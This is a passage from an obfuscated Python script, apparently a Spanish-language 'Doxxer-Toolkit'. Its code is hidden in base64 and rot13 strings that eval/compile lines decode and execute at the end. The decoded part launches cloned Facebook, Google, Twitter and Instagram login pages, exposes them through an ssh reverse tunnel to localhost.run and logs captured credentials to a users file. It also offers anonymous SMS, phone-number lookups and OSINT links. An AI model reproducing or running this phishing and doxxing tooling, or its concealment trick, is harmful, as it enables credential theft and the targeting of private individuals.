cyB2ZXIgY29uIGVsIGNvbWFuZG86IGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy5tYWdlbnRhfVt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykKICAgIHByaW50KCcgJykKICAgIGNtZCA9ICJwaHAgLXQgLnBhZ2VzL0ZhY2Vib29rIC1TIGxvY2FsaG9zdDo4MDgwICYgc3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4iCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpCiAgICBhID0gcC5jb21tdW5pY2F0ZSgpWzBdCiAgZWxpZiBZUCA9PSAyOgogICAgcHJpbnQoZidcbntDb2xvcmVzLmF6dWx9W35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW46IERveHhlci1Ub29sa2l0Ly5wYWdlcy9Hb29nbGUvdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy52ZXJkZX1bfl0gTG9zIHB1ZWRlcyB2ZXIgY29uIGVsIGNvbWFuZG86IGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvR29vZ2xlL3VzdWFyaW9zLnR4dCcpCiAgICBwcmludChmJ1xue0NvbG9yZXMubWFnZW50YX1bfl0gUGFyYSBzYWxpciBwcmVzaW9uYSBDVFJMICsgQycpCiAgICBwcmludCgnICcpCiAgICBjbWQgPSAicGhwIC10IC5wYWdlcy9Hb29nbGUgLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biIKICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSkKICAgIGEgPSBwLmNvbW11bmljYXRlKClbMF0KICBlbGlmIFlQID09IDM6CiAgICBwcmludChmJ1xue0NvbG9yZXMuYXp1bH1bfl0gTG9zIHVzdWFyaW9zIHNlIGd1YXJkYXJhbiBlbjogRG94eGVyLVRvb2xraXQvLnBhZ2VzL1R3aXR0ZXIvdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy52ZXJkZX1bfl0gTG9zIHB1ZWRlcyB2ZXIgY29uIGVsIGNvbWFuZG86IGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvVHdpdHRlci91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLm1hZ2VudGF9W35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQogICAgcHJpbnQoJyAnKQogICAgY21kID0gInBocCAtdCAucGFnZXMvVHdpdHRlciAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIgogICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzaGVsbD1UcnVlKQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQogIGVsaWYgWVAgPT0gNDoKICAgIHByaW50KGYnXG57Q29sb3Jlcy5henVsfVt+XSBMb3MgdXN1YXJpb3Mgc2UgZ3VhcmRhcmFuIGVuOiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvSW5zdGFncmFtL3VzdWFyaW9zLnR4dCcpCiAgICBwcmludChmJ1xue0NvbG9yZXMudmVyZGV9W35dIExvcyBwdWVkZXMgdmVyIGNvbiBlbCBjb21hbmRvOiBjYXQgRG94eGVyLVRvb2xraXQvLnBhZ2VzL0luc3RhZ3JhbS91c3Vhcmlvcy50eHQnKQogICAgcHJpbnQoZidcbntDb2xvcmVzLm1hZ2VudGF9W35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQogICAgcHJpbnQoJyAnKQogICAgY21kID0gInBocCAtdCAucGFnZXMvSW5zdGFncmFtIC1TIGxvY2FsaG9zdDo4MDgwICYgc3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4iCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpCiAgICBhID0gcC5jb21tdW5pY2F0ZSgpWzBdCiAgZWxpZiBZUCA9PSAwMDoKICAgIG1lbnUoKQogIGVsaWYgWVAgPT0gOTk6CiAgICBleGl0KCkKICAKZGVmIHNtcygpOgogIHByaW50KCdcblsxXSBBYnJpciBwYXJhIGxpbmsgcGFyYSBsaW51eCcpCiAgcHJpbnQoJ1xuWzJdIEFicmlyIHBhcmEgdGVybXV4JykKICBwcmludCgnXG5bMDBdIFJlZ3Jlc2FyIGFsIG1lbnUgcHJpbmNpcGFsJykKICBwcmludCgnXG5bOTldIFNhbGlyJykKICBZUiA9IGludChpbnB1dCgnW35dIEVsaWplIHVuYSBvcGNpb246ICcpKQogIGlmIFlSID09IDE6CiAgICB3ZWJicm93c2VyLm9wZW4oJ2h0dHA6Ly93d3cuc2VuZGFub255bW91c3Ntcy5jb20vJykKICAgIHNtcygpCiAgZWxpZiBZUiA9PSAyOgogICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwOi8vd3d3LnNlbmRhbm9ueW1vdXNzbXMuY29tLyIpCiAgICBzbXMoKQogIGVsaWYgWVIgPT0gMDA6CiAgICBtZW51KCkKICBlbGlmIFlSID09IDk5OgogICAgZXhpdCgpCiAgICAKZGVmIG51bWVybygpOgogICAgcHJpbnQoJ1xuW35dIEZvcm1hdG86IEPDs2RpZ28gZGUgcGHDrXMgKyBOdW1lcm8nKQogICAgcHJpbnQoJ1t+XSBFamVtcGxvOiArMTkwODc2NTQzMjEnKQogICAgcGhvbmVfbnVtYmVyID0gc3RyKGlucHV0KCdbfl0gSW5ncmVzYSBlbCBudW1lcm8gZGUgdGVsZWZvbm86ICcpKQogICAgcGhvbmVfbnVtYmVyID0gJycuam9pbihwaG9uZV9udW1iZXIuc3BsaXQoKSkKICAgIHBob25lZG94ID0gUGhvbmVEb3gocGhvbmVfbnVtYmVyKQogICAgcHJpbnQoZidbfl0gT2J0ZW5pZW5kbyBpbmZvcm1hY2nDs24gZGUge3Bob25lX251bWJlcn0nKQogICAgcGhvbmVkb3guc2ltcGxlX3NjYW4oKQogICAgcHJpbnQoJ1t+XSBFc2NhbmVvIGNvbXBsZXRvJykKCmRlZiBxcmNvZGlnbygpOgogIHByaW50KCdcblt+XSBJbmdyZXNhIHVuIHRleHRvIG8gdXJsIHBhcmEgY29udmVydGlyIGEgY29kaWdvIHFyJykKICBwcmludCgnW35dIExhIGltYWdlbiBzZSBndWFyZGFyYSBjb21vOiBxci5wbmcnKQogIHByaW50KGYne0NvbG9yZXMuYXp1bH1bfl0gQXRlbmNpb24gc2kgZXhpc3RlIHVuYSBpbWFnZW4gZGVudHJvIGRlbCBkaXJlY3RvcmlvIGRlIERveHhlci1Ub29sa2l0IGNvbiBlbCBub21icmUgcXIucG5nIGVzdGEgaW1hZ2VuIHNlIHZhIGEgcmVlbXBsYXphcicpCiAgdGV4dG8gPSBpbnB1dChmJ3tDb2xvcmVzLnJlZH1bfl0gSW5ncmVzYSB1biB0ZXh0bzogJykKICBpZiBvcy5wYXRoLmlzZmlsZSgiRG94eGVyLVRvb2xraXQvcXIucG5nIik6CiAgICBvcy5zeXN0ZW0oInJtIERveHhlci1Ub29sa2l0L3FyLnBuZyIpCiAgICBpbWcgPSBxcmNvZGUubWFrZShmJ3t0ZXh0b30nKQogICAgdHlwZShpbWcpCiAgICBpbWcuc2F2ZSgiY29kaWdvLnBuZyIpCiAgICBwcmludCgnW35dIENvZGlnbyBnZW5lcmFkbyBjb24gZXhpdG8hJykKICAgIHRpbWUuc2xlZXAoMikKICAgIG1lbnUoKQogIGVsc2U6CiAgICBpbWcgPSBxcmNvZGUubWFrZShmJ3t0ZXh0b30nKQogICAgdHlwZShpbWcpCiAgICBpbWcuc2F2ZSgicXIucG5nIikKICAgIHByaW50KCdbfl0gQ29kaWdvIGdlbmVyYWRvIGNvbiBleGl0byEnKQogICAgdGltZS5zbGVlcCgyKQogICAgbWVudSgpCgpkZWYgb3NpbnRwYSgpOgogIG9zLnN5c3RlbSgiY2xlYXIiKQogIHByaW50KGxvZ28pCiAgcHJpbnQoJycnXG4KICBbMV0gb3NpbnRmcmFtZXdvcmsKICAKICBbMl0gb3NpbnQgdGVjaG5pcXVlcwogIAogIFswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwKICAKICBbOTldIFNhbGlyCiAgJycnKQogIG9zaW50ID0gaW50KGlucHV0KCdbfl0gRXNjcmliZSB1biBudW1lcm86ICcpKQogIGlmIG9zaW50ID09IDE6CiAgICBwcmludCgnXG5bMV0gQWJyaXIgbGluayBwYXJhIGxpbnV4JykKICAgIHByaW50KCdcblsyXSBBYnJpciBsaW5rIHBhcmEgdGVybXV4JykKICAgIHByaW50KCdcblswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwnKQogICAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpCiAgICBlbGVqaXI5OSA9IGludChpbnB1dCgnW35dIEVzY3JpYmUgdW4gbnVtZXJvOiAnKSkKICAgIGlmIGVsZWppcjk5ID09IDE6CiAgICAgIHdlYmJyb3dzZXIub3BlbignaHR0cHM6Ly9vc2ludGZyYW1ld29yay5jb20vJykKICAgICAgb3NpbnRwYSgpCiAgICBlbGlmIGVsZWppcjk5ID09IDI6CiAgICAgIG9zLnN5c3RlbSgidGVybXV4LW9wZW4gaHR0cHM6Ly9vc2ludGZyYW1ld29yay5jb20vIikKICAgI'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
